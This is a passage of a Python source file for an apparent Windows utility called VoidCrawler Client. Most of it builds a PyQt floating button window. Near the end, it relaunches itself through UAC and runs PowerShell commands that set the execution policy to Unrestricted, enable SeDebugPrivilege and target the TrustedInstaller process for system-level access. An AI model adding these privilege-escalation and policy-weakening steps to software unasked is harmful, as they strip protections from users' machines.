            QLabel:hover {
                background: #e74c3c;
                color: white;
            }
        """)
        close_button.setCursor(Qt.PointingHandCursor)
        close_button.mousePressEvent = self.close_button_clicked
        
        if admin:
            # 添加到标题栏布局
            title_layout.addWidget(icon_label)

        # icon_label.move(50, 50)
        # icon_label.raise_()
        # title_layout.addStretch(1)
        title_layout.addWidget(title_label)  # 标题占据剩余空间
        # title_layout.addStretch(1)
        # title_layout.setSpacing(50)  # 设置图标和标题之间的间距

        title_layout.addWidget(close_button)    # 关闭按钮固定宽度
        
        layout.addWidget(title_widget)
        
        # 设置标题栏的鼠标事件（用于拖动）
        title_widget.mousePressEvent = self.title_mouse_press
        title_widget.mouseMoveEvent = self.title_mouse_move
        title_widget.mouseReleaseEvent = self.title_mouse_release
        
        # 计算最大文本宽度
        max_width = self.calculate_max_text_width()
        
        # 创建按钮
        button_height = 60
        for i in self.buttons_cfg:
            button = self.create_stylish_button(i, max_width, button_height)
            layout.addWidget(button)
        
        # 计算总高度：标题高度 + 所有按钮高度
        total_height = 40 + (len(self.buttons_cfg) * button_height)
        
        # 设置窗口大小
        self.setFixedSize(max_width, total_height)
        
        # 设置窗口初始位置为屏幕左侧（稍微偏移）
        self.set_window_initial_position()
        
    def set_window_initial_position(self):
        """设置窗口初始位置为屏幕左侧（稍微偏移）"""
        # 获取屏幕尺寸
        screen_geometry = QApplication.primaryScreen().availableGeometry()
        screen_width = screen_geometry.width()
        screen_height = screen_geometry.height()
        
        # 计算窗口位置（左侧，稍微偏移）
        window_width = self.width()
        window_height = self.height()
        x = 50  # 距离左侧的距离（像素）
        y = (screen_height - window_height) // 2  # 垂直居中
        
        self.move(x, y)
        
    def title_mouse_press(self, event):
        """标题栏鼠标按下事件"""
        if event.button() == Qt.LeftButton:
            self.dragging = True
            self.drag_position = event.globalPos() - self.frameGeometry().topLeft()
            event.accept()
    
    def title_mouse_move(self, event):
        """标题栏鼠标移动事件"""
        if event.buttons() == Qt.LeftButton and self.dragging:
            self.move(event.globalPos() - self.drag_position)
            event.accept()
    
    def title_mouse_release(self, event):
        """标题栏鼠标释放事件"""
        if event.button() == Qt.LeftButton:
            self.dragging = False
            event.accept()
        
    def calculate_max_text_width(self):
        """计算所有按钮文本的最大宽度"""
        font = QFont("Microsoft YaHei", 18, QFont.Bold)
        font_metrics = QFontMetrics(font)
        max_width = 0
        
        for i in self.buttons_cfg:
            # 根据类型确定显示的文本
            display_text = i['text']
            if i['type'] in [ButtonType.TYPE_SWITCH_ON, ButtonType.TYPE_SWITCH_OFF]:
                display_text = f" ███ | {i['text']}"
            
            # 计算文本宽度
            text_width = font_metrics.horizontalAdvance(display_text)
            max_width = max(max_width, text_width)
        
        # 加上左右内边距
        return max_width + 40  # 20px 左内边距 + 20px 右内边距

    def create_stylish_button(self, cfg, width, height):
        # 根据类型确定显示的文本和颜色
        display_text = cfg['text']
        text_color = "white"  # 默认文本颜色
        
        if cfg['type'] == ButtonType.TYPE_SWITCH_ON:
            display_text = f" ███ | {cfg['text']}"
            text_color = "#00ff00"  # 绿色
        elif cfg['type'] == ButtonType.TYPE_SWITCH_OFF:
            display_text = f" ███ | {cfg['text']}"
            text_color = "#ff0000"  # 红色
        
        # 创建按钮容器，用于放置按钮和悬浮图标
        button_container = QWidget()
        button_container.setFixedSize(width, height)
        button_container.setStyleSheet("background: transparent;")
        
        # 创建覆盖布局（允许图标悬浮在按钮上方）
        container_layout = QHBoxLayout(button_container)
        container_layout.setContentsMargins(0, 0, 0, 0)
        container_layout.setSpacing(0)
        
        # 创建按钮 - 保持完整宽度
        button = QPushButton(display_text)
        button.setFixedSize(width, height)  # 恢复完整宽度
        
        # 存储按钮的配置信息
        button.config = cfg
        
        # 连接按钮点击事件
        if cfg['command']:
            def f():
                self.on_button_click(button)
                if cfg['id'] == 'ToggleWindowInvisibility':
                    cfg['command'](button, self)
                else:
                    cfg['command'](button)

            button.clicked.connect(f)
        else:
            # 如果没有设置command，连接到默认处理函数
            button.clicked.connect(lambda checked, btn=button: self.on_button_click(btn))
        
        # 启用右键菜单
        button.setContextMenuPolicy(Qt.CustomContextMenu)
        button.customContextMenuRequested.connect(lambda pos, btn=button: self.on_button_right_click(btn, pos))
        
        # 设置工具提示
        if cfg['description']:
            button.setToolTip(cfg['description'])
        
        # 根据按钮类型设置不同的样式
        if cfg['type'] in [ButtonType.TYPE_SWITCH_ON, ButtonType.TYPE_SWITCH_OFF]:
            # 开关按钮样式 - 使用指定的文本颜色
            button.setStyleSheet(f"""
                QPushButton {{
                    background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                            stop: 0 {cfg['color']}, stop: 1 {self.darken_color(cfg['color'])});
                    color: {text_color};
                    border: none;
                    font-size: 18px;
                    font-weight: bold;
                    text-align: left;
                    padding-left: 20px;
                }}
                QPushButton:hover {{
                    background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                            stop: 0 {self.lighten_color(cfg['color'])}, stop: 1 {cfg['color']});
                }}
                QPushButton:pressed {{
                    background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                            stop: 0 {self.darken_color(cfg['color'])}, stop: 1 {self.darken_color(cfg['color'], 40)});
                }}
            """)
        else:
            # 普通按钮样式
            button.setStyleSheet(f"""
                QPushButton {{
                    background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                            stop: 0 {cfg['color']}, stop: 1 {self.darken_color(cfg['color'])});
                    color: white;
                    border: none;
                    font-size: 18px;
                    font-weight: bold;
                    text-align: left;
                    padding-left: 20px;
                }}
                QPushButton:hover {{
                    background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                            stop: 0 {self.lighten_color(cfg['color'])}, stop: 1 {cfg['color']});
                }}
                QPushButton:pressed {{
                    background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                            stop: 0 {self.darken_color(cfg['color'])}, stop: 1 {self.darken_color(cfg['color'], 40)});
                }}
            """)
        
        # 将按钮添加到布局中
        container_layout.addWidget(button)
        
        # 如果is_admin为True，创建悬浮图标
        if cfg.get('is_admin', False):
            admin_icon = QLabel(button_container)  # 将按钮容器作为父级
            admin_pixmap = QPixmap("./assets/admin.png")
            
            # 设置较小的图标大小
            icon_size = 20
            
            if not admin_pixmap.isNull():
                # 缩放图片
                admin_pixmap = admin_pixmap.scaled(icon_size, icon_size, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                admin_icon.setPixmap(admin_pixmap)
            else:
                # 如果图片加载失败，显示一个替代文本
                admin_icon.setText("⚡")
                admin_icon.setStyleSheet("color: gold; font-size: 14px; font-weight: bold; background: transparent;")
            
            admin_icon.setFixedSize(icon_size, icon_size)
            admin_icon.setStyleSheet("background: transparent; margin: 0px; padding: 0px; border: none;")
            admin_icon.setToolTip("Administrator")
            
            # 将图标定位在按钮的右上角
            icon_x = width - icon_size - 10  # 距离右侧10像素
            icon_y = (height - icon_size) // 2  # 垂直居中
            admin_icon.move(icon_x, icon_y)
            
            # 确保图标在按钮上方显示
            admin_icon.raise_()
            
            # 为图标添加鼠标事件处理，让点击图标相当于点击按钮
            def admin_icon_mouse_press(event):
                # 模拟按钮点击
                if event.button() == Qt.LeftButton:
                    # 触发按钮的左键点击
                    button.click()
                elif event.button() == Qt.RightButton:
                    # 触发按钮的右键菜单
                    button.customContextMenuRequested.emit(button.mapFromGlobal(event.globalPos()))
                event.accept()
            
            def admin_icon_mouse_release(event):
                event.accept()
            
            # 连接鼠标事件
            admin_icon.mousePressEvent = admin_icon_mouse_press
            admin_icon.mouseReleaseEvent = admin_icon_mouse_release
            
            # 设置鼠标光标为手型，表示可点击
            admin_icon.setCursor(Qt.PointingHandCursor)
        
        return button_container
    
    def on_button_click(self, button):
        """按钮点击的默认处理函数"""
        cfg = button.config
        if cfg['type'] in [ButtonType.TYPE_SWITCH_ON, ButtonType.TYPE_SWITCH_OFF]:
            # 切换开关状态
            if cfg['type'] == ButtonType.TYPE_SWITCH_ON:
                cfg['type'] = ButtonType.TYPE_SWITCH_OFF
                button.setText(f" ███ | {cfg['text']}")
                # 切换到红色文本
                button.setStyleSheet(f"""
                    QPushButton {{
                        background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                                  stop: 0 {cfg['color']}, stop: 1 {self.darken_color(cfg['color'])});
                        color: #ff0000;
                        border: none;
                        font-size: 18px;
                        font-weight: bold;
                        text-align: left;
                        padding-left: 20px;
                    }}
                    QPushButton:hover {{
                        background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                                  stop: 0 {self.lighten_color(cfg['color'])}, stop: 1 {cfg['color']});
                    }}
                    QPushButton:pressed {{
                        background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                                  stop: 0 {self.darken_color(cfg['color'])}, stop: 1 {self.darken_color(cfg['color'], 40)});
                    }}
                """)
            else:
                cfg['type'] = ButtonType.TYPE_SWITCH_ON
                button.setText(f" ███ | {cfg['text']}")
                # 切换到绿色文本
                button.setStyleSheet(f"""
                    QPushButton {{
                        background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                                  stop: 0 {cfg['color']}, stop: 1 {self.darken_color(cfg['color'])});
                        color: #00ff00;
                        border: none;
                        font-size: 18px;
                        font-weight: bold;
                        text-align: left;
                        padding-left: 20px;
                    }}
                    QPushButton:hover {{
                        background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                                  stop: 0 {self.lighten_color(cfg['color'])}, stop: 1 {cfg['color']});
                    }}
                    QPushButton:pressed {{
                        background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                                  stop: 0 {self.darken_color(cfg['color'])}, stop: 1 {self.darken_color(cfg['color'], 40)});
                    }}
                """)
            logging.debug(f"切换 {cfg['text']} 状态：{cfg['type']}")
        else:
            logging.debug(f"点击 {cfg['text']} 按钮")
    
    def on_button_right_click(self, button, pos):
        """按钮右键点击处理函数"""
        cfg = button.config
        if cfg['set_command']:
            cfg['set_command']()
        else:
            logging.debug(f"右键点击 {cfg['text']} 按钮，位置: {pos}")
    
    def darken_color(self, hex_color, amount=20):
        """加深颜色"""
        hex_color = hex_color.lstrip('#')
        rgb = tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        darkened = tuple(max(0, value - amount) for value in rgb)
        return f"#{darkened[0]:02x}{darkened[1]:02x}{darkened[2]:02x}"
    
    def lighten_color(self, hex_color, amount=20):
        """加亮颜色"""
        hex_color = hex_color.lstrip('#')
        rgb = tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        lightened = tuple(min(255, value + amount) for value in rgb)
        return f"#{lightened[0]:02x}{lightened[1]:02x}{lightened[2]:02x}"


def is_admin() -> bool:
    """
    检查当前程序是否具有管理员或更高权限

    通过尝试在系统目录创建文件来检测管理员权限
    
    Returns:
        bool: 如果用户有管理员权限返回True，否则返回False
    """
    try:
        # 尝试在系统目录创建临时文件
        temp_file = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'temp_test_file.tmp')
        with open(temp_file, 'w') as f:
            f.write('test')
        os.remove(temp_file)
        return True
    except (IOError, OSError, PermissionError):
        return False
    # try:
    #     # Windows系统
    #     if os.name == 'nt':
    #         import ctypes
    #         return ctypes.windll.shell32.IsUserAnAdmin()
        
    #     # Unix/Linux/Mac系统
    #     else:
    #         # 在Unix系统中，root用户的UID为0
    #         return os.geteuid() == 0
            
    # except Exception as e:
    #     raise Exception(f"检查权限时出错: {e}")


def authorized_administrator() -> None | NoReturn:
    """
    UAC 提权管理员并重启程序。
    """
    if is_admin():
        # 权限足够
        return
    else:
        # 权限不足，尝试 UAC 提权，这里采用合法的方式提权。
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit(0)


def configuration_environment() -> None:
    """
    首次使用或故障时配置环境
    """
    subprocess.run(["powershell.exe", "-Command", "Install-Module -Name NtObjectManager -Force -AllowClobber"], capture_output=True, text=True, check=False)
    subprocess.run(["powershell.exe", "-Command", "Set-ExecutionPolicy Unrestricted -Force"], capture_output=True, text=True, check=False)
    subprocess.run(["powershell.exe", "-Command", "Import-Module NtObjectManager"], capture_output=True, text=True, check=False)
    subprocess.run(["powershell.exe", "-Command", "sc.exe start TrustedInstaller"], capture_output=True, text=True, check=False)
    subprocess.run(["powershell.exe", "-Command", "Set-NtTokenPrivilege SeDebugPrivilege"], capture_output=True, text=True, check=False)
    subprocess.run(["powershell.exe", "-Command", "$p = Get-NtProcess -Name TrustedInstaller.exe"], capture_output=True, text=True, check=False)


def init() -> None:
    """
    初始化
    """
    global style
    style = ttk.Style()
    style.configure("Solid.TButton", background="#80808000")


# save_config_windows : list = []

def switch_display_status() -> None:
    """
    切换显示/隐藏状态
    """
    global config_windows
    if stylish_window.isVisible():
        stylish_window.hide()
        # save_config_windows = config_windows
        # for i in config_windows:
            # i.close_with_animation()
            # i.close()
        #     # config_windows 在其他代码中会自动销毁
    else:
        stylish_window.setWindowState(Qt.WindowNoState)
        # stylish_window.showNormal()
        stylish_window.show()
        # config_windows += save_config_windows
        # for i in config_windows:
        #     i.show()
        #     # i.setWindowState(Qt.WindowNoState)
        #     # i.showNormal()
        #     # i.raise_()           # 提升到前台
        #     # i.activateWindow()   # 激活窗口
        #     # i.setFocus()
        stylish_window.activateWindow()   # 激活窗口



if __name__ == "__main__":
    root = Tk()
    root.withdraw()
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-privilege_escalation',
        '--privilege-escalation',
        action='store_true',
    )
    args = parser.parse_args()
    if args.privilege_escalation:
        showinfo("VoidCrawler Client", "Privilege escalation successful! / 提权成功！")


    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    if not config["no_admin"]:
        authorized_administrator()
        # subprocess.run 函数会阻塞
        result = subprocess.run(["powershell.exe", "-Command", "Get-Module -Name NtObjectManager -ListAvailable"], capture_output=True, text=True, check=False)
        if len(result.stdout) == 0:
            showinfo('VoidCrawler', '你应该是第一次使用（如果不是，说明你卸载了某些模块），点击确定后将自动配置环境。')
            configuration_environment()
    
    app = QApplication(sys.argv)
    font = QFont("Microsoft YaHei", 10) # 设置应用程序字体
    app.setFont(font)
    stylish_window = StylishWindow()

    logging.debug('VoidCrawler Client initialization completed!')

    t = threading.Thread(target=funlib.GlobalHotkey(config['Shortcutkey']['display_window'], switch_display_status).start, daemon=True)
    t.start()

    stylish_window.show()

    sys.exit(app.exec_())